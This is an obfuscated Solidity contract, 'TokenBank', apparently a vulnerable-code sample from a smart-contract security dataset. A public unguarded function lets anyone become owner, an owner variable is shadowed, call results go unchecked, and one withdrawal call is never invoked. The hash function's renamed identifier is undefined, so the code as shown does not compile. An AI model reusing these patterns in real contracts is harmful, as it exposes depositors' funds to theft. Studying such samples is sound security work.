pragma solidity ^0.4.18;

contract Ownable
{
    address _0xb57bdd;
    address _0xe42542 = msg.sender;

    function _0x8187b5(address _0xa971ef)
    public
    _0xa65855
    {
        _0xb57bdd = _0xa971ef;
    }

    function _0x2fb77b()
    public
    {
        if(msg.sender==_0xb57bdd)
        {
            _0xe42542=_0xb57bdd;
        }
    }

    modifier _0xa65855
    {
        if(_0xe42542 == msg.sender)_;
    }
}

contract Token is Ownable
{
    address _0xe42542 = msg.sender;
    function WithdrawToken(address _0x45f423, uint256 _0x0fa23e,address _0x2eba6b)
    public
    _0xa65855
    {
        _0x45f423.call(bytes4(_0x77d792("transfer(address,uint256)")),_0x2eba6b,_0x0fa23e);
    }
}

contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;


    function _0xa327be()
    public
    {
        _0xe42542 = msg.sender;
        MinDeposit = 1 ether;
    }

    function()
    payable
    {
        Deposit();
    }

    function Deposit()
    payable
    {
        if(msg.value>MinDeposit)
        {
            Holders[msg.sender]+=msg.value;
        }
    }

    function WitdrawTokenToHolder(address _0xe5a66a,address _0x2f86ae,uint _0x1dbc84)
    public
    _0xa65855
    {
        if(Holders[_0xe5a66a]>0)
        {
            Holders[_0xe5a66a]=0;
            WithdrawToken(_0x2f86ae,_0x1dbc84,_0xe5a66a);
        }
    }

    function WithdrawToHolder(address _0x4a8f9f, uint _0xccbf2d)
    public
    _0xa65855
    payable
    {
        if(Holders[msg.sender]>0)
        {
            if(Holders[_0x4a8f9f]>=_0xccbf2d)
            {
                _0x4a8f9f.call.value(_0xccbf2d);
                Holders[_0x4a8f9f]-=_0xccbf2d;
            }
        }
    }

    function Bal() public constant returns(uint){return this.balance;}
}